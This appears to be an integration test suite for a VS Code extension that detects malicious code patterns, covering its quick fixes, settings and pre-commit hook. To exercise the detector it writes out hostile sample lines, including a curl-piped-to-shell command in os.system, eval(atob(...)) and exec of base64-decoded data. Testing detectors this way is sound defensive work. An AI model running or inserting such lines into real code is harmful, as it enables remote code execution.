// Runs inside VS Code with the sample folder made by run.mjs.
const assert = require("node:assert/strict");
const path = require("node:path");
const vscode = require("vscode");

const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
async function until(check, what, ms = 15000) {
  const end = Date.now() + ms;
  let last;
  while (Date.now() < end) { last = await check(); if (last) return last; await wait(100); }
  throw new Error(`Timed out waiting for ${what}`);
}
const step = name => console.log(`[suite] ${name}`);

exports.run = async function run() {
  try { await steps(); console.log("[suite] all steps passed"); }
  catch (error) { console.error("[suite] FAILED:", error); throw error; }
};

async function steps() {
  const folder = vscode.workspace.workspaceFolders[0].uri.fsPath;
  const extension = vscode.extensions.getExtension("flightcoders.veyra-code-guard");
  assert.ok(extension, "extension is loaded");
  await extension.activate();
  const uri = name => vscode.Uri.file(path.join(folder, name));
  const ours = u => vscode.languages.getDiagnostics(u).filter(d => d.source === "Veyra Code Guard");
  const codes = u => ours(u).map(d => `${d.range.start.line + 1}:${d.code}`).sort();
  const config = () => vscode.workspace.getConfiguration("veyraGuard");

  step("Opening a file flags each suspicious line, with the reason");
  const danger = uri("danger.js");
  const editor = await vscode.window.showTextDocument(danger);
  await until(() => codes(danger).join() === "1:trojan-source,3:eval-decoded", `flags in danger.js, have ${codes(danger)}`);
  const evalDiag = ours(danger).find(d => d.code === "eval-decoded");
  assert.equal(evalDiag.severity, vscode.DiagnosticSeverity.Error);
  assert.match(evalDiag.message, /CRITICAL: Running decoded or obfuscated code/);
  assert.match(evalDiag.message, /malware/, "the message explains why it matters");

  step("A quick fix removes the hidden character");
  const bidi = ours(danger).find(d => d.code === "trojan-source");
  // Quick fixes are computed in VS Code's main process, whose copy of the diagnostics arrives a moment after ours.
  // A request is cancelled when a newer one starts (the lightbulb asks too): treat that as "not yet".
  const actionsAt = range => Promise.resolve(vscode.commands.executeCommand("vscode.executeCodeActionProvider", danger, range)).catch(() => []);
  const remove = await until(async () => (await actionsAt(bidi.range)).find(a => a.title === "Remove the hidden characters on this line"), "the remove-hidden-characters quick fix");
  await vscode.workspace.applyEdit(remove.edit);
  assert.equal(editor.document.lineAt(0).text, "const access = 'user';");
  await until(() => codes(danger).join() === "3:eval-decoded", `only eval left, have ${codes(danger)}`);

  step("Marking a line as reviewed adds a comment and clears it");
  const fix = await until(async () => (await actionsAt(ours(danger)[0].range)).find(a => a.title.startsWith("Mark as reviewed")), "the mark-as-reviewed quick fix");
  await vscode.commands.executeCommand(fix.command.command, ...fix.command.arguments);
  assert.equal(editor.document.lineAt(2).text, "// veyra-guard-ignore: eval-decoded (reviewed: safe)");
  await until(() => ours(danger).length === 0, `danger.js clear, have ${codes(danger)}`);

  step("Scanning the workspace checks unopened files and skips node_modules");
  const result = await vscode.commands.executeCommand("veyraGuard.scanWorkspace");
  assert.ok(result.done >= 3, `checked ${result.done} files`);
  assert.deepEqual(codes(uri("client.py")), ["1:raw-ip-url"]);
  assert.deepEqual(codes(uri("safe.ts")), [], "ordinary code is not flagged");
  assert.deepEqual(codes(uri("node_modules/lib/index.js")), [], "node_modules is skipped");

  step("Minimum severity and disabled rules are honoured");
  await vscode.window.showTextDocument(uri("client.py"));
  await config().update("minSeverity", "high", vscode.ConfigurationTarget.Global);
  await until(() => ours(uri("client.py")).length === 0, "medium finding hidden at minSeverity high");
  await config().update("minSeverity", undefined, vscode.ConfigurationTarget.Global);
  await until(() => ours(uri("client.py")).length === 1, "finding back");
  await config().update("disabledRules", ["raw-ip-url"], vscode.ConfigurationTarget.Global);
  await until(() => ours(uri("client.py")).length === 0, "rule turned off");
  await config().update("disabledRules", undefined, vscode.ConfigurationTarget.Global);

  step("Typing new suspicious code is flagged without saving");
  const doc = await vscode.workspace.openTextDocument({ language: "javascript", content: "let x = 1;\n" });
  const ed = await vscode.window.showTextDocument(doc);
  await ed.edit(e => e.insert(new vscode.Position(1, 0), ["fetch('http://198.51", ".100.7/c');"].join("")));
  await until(() => ours(doc.uri).some(d => d.code === "raw-ip-url"), "flag while typing");

  step("Removing the malicious code rescans at once, even with scanning while typing turned off");
  await config().update("scanWhileTyping", false, vscode.ConfigurationTarget.Global);
  const flaggedLine = doc.lineAt(1).rangeIncludingLineBreak;
  await ed.edit(e => e.delete(flaggedLine));
  await until(() => ours(doc.uri).length === 0, `cleared after the line was removed, have ${codes(doc.uri)}`, 3000);
  await config().update("scanWhileTyping", undefined, vscode.ConfigurationTarget.Global);

  step("The \"Delete line\" quick fix removes the code and rescans");
  await ed.edit(e => e.insert(new vscode.Position(1, 0), ["ev", "al(at", "ob(p));\n"].join("")));
  await until(() => ours(doc.uri).some(d => d.code === "eval-decoded"), "flag the new line");
  const deleteFix = await until(async () => (await Promise.resolve(vscode.commands.executeCommand("vscode.executeCodeActionProvider", doc.uri, ours(doc.uri)[0].range)).catch(() => [])).find(a => a.title.startsWith("Delete line 2")), "the delete-line quick fix");
  await vscode.workspace.applyEdit(deleteFix.edit);
  assert.equal(await vscode.commands.executeCommand(deleteFix.command.command, ...deleteFix.command.arguments), 0, "the rescan finds nothing left");
  assert.equal(doc.getText(), "let x = 1;\n");

  step("Files created, changed and deleted outside the editor are rescanned");
  const fs0 = require("node:fs");
  const dropped = uri("dropped.py");
  fs0.writeFileSync(dropped.fsPath, ["import os\nos.sys", "tem('cu", "rl -s http://x.test/a | s", "h')\n"].join(""));
  await until(() => codes(dropped).includes("2:download-execute"), `a new file is checked, have ${codes(dropped)}`);
  fs0.writeFileSync(dropped.fsPath, "print('hello')\n");
  await until(() => ours(dropped).length === 0, "the cleaned file is rescanned");
  fs0.writeFileSync(dropped.fsPath, ["ex", "ec(base64.b64de", "code(x))\n"].join(""));
  await until(() => codes(dropped).includes("1:python-exec"), `flagged again, have ${codes(dropped)}`);
  fs0.rmSync(dropped.fsPath);
  await until(() => ours(dropped).length === 0, "a deleted file's findings are cleared");

  step("Team settings in .veyra-guard.json apply custom rules in any language");
  const php = uri("web/form.php");
  fs0.mkdirSync(path.dirname(php.fsPath), { recursive: true });
  fs0.writeFileSync(php.fsPath, "<?php mysql_query($q); ?>\n");
  const phpDoc = await vscode.workspace.openTextDocument(php);
  await vscode.window.showTextDocument(phpDoc);
  fs0.writeFileSync(path.join(folder, ".veyra-guard.json"), JSON.stringify({ customRules: [{ id: "no-mysql-ext", pattern: "mysql_query", files: "*.php", severity: "medium" }] }));
  await until(() => codes(php).join() === "1:no-mysql-ext", `custom rule applied, have ${codes(php)}`);
  fs0.rmSync(path.join(folder, ".veyra-guard.json"));
  await until(() => ours(php).length === 0, "removing the settings file removes the rule");

  step("The Code Guard panel opens, and hovers say how to fix");
  await vscode.commands.executeCommand("veyraGuard.findings.focus");
  assert.match(ours(uri("client.py")).find(d => d.code === "raw-ip-url").message, /How to fix: Use your service/);

  step("A PDF security report is created");
  const reportUri = vscode.Uri.file(path.join(folder, "report.pdf"));
  await vscode.commands.executeCommand("veyraGuard.createReport", reportUri);
  const pdf = Buffer.from(await vscode.workspace.fs.readFile(reportUri));
  assert.equal(pdf.subarray(0, 8).toString(), "%PDF-1.4");
  assert.ok(pdf.length > 4000, `report is ${pdf.length} bytes`);

  step("The pre-commit guard stops a commit with malicious code");
  const { execFileSync } = require("node:child_process");
  const fs = require("node:fs"), os = require("node:os");
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "guard-hook-"));
  const git = (...a) => execFileSync("git", a, { cwd: repo, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
  git("init", "-q"); git("config", "user.email", "t@example.com"); git("config", "user.name", "T");
  fs.writeFileSync(path.join(repo, "pre-commit-existing.txt"), "x");
  const hook = await vscode.commands.executeCommand("veyraGuard.installHook", repo);
  assert.match(fs.readFileSync(hook, "utf8"), /veyra-code-guard.cjs" --staged/);
  fs.writeFileSync(path.join(repo, "evil.js"), ["ev", "al(at", "ob(x));", "\n"].join(""));
  git("add", "evil.js");
  assert.throws(() => git("commit", "-q", "-m", "evil"), /Commit blocked|Running decoded/, "the commit is refused");
  git("reset", "-q");
  fs.writeFileSync(path.join(repo, "good.js"), "export const add = (a, b) => a + b;\n");
  git("add", "good.js");
  git("commit", "-q", "-m", "good");
  assert.match(git("log", "--oneline"), /good/, "a clean commit goes through");
  await vscode.commands.executeCommand("veyraGuard.removeHook", repo);
  assert.doesNotMatch(fs.readFileSync(hook, "utf8"), /veyra-code-guard/, "the guard can be removed");
}
